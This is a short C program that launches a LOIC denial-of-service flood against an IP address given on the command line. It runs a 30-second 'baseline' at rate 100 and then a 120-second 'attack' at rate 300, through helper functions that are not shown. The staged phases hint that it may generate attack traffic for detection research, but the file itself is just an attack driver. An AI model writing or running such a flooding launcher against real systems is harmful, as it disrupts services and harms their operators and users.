#include "attack_process.h"
#include "io.h"

void set_base_valor(char** arg_list, char* loic_path, char* ip){
    arg_list[PROGRAM_PATH] = loic_path;
    arg_list[IP] = ip;
    arg_list[RATE_FLAG] = "-r";
    arg_list[RATE_NUMBER] = "100";
    arg_list[FINAL_ARG] = NULL;
}

void set_baseline(
        char** arg_list,
        const char* loic_path,
        const unsigned int time_to_live
        ){

    print_set_baseline();
    call_attack(loic_path, arg_list, time_to_live);
}

void attack(char** arg_list,
        const char* loic_path,
        const unsigned int time_to_live
        ){

    print_attack();
    arg_list[RATE_NUMBER] = "300";
    call_attack(loic_path, arg_list, time_to_live);
}

int main(int argc, char *argv[]){
    char* loic_path = get_loic_path();
    char** arg_list = alloc_arg_list();
    char* ip = get_ip(argc, argv);

    set_base_valor(arg_list, loic_path, ip);

    set_baseline(arg_list, loic_path, 30);
    attack(arg_list, loic_path, 120);

    return 0;
}
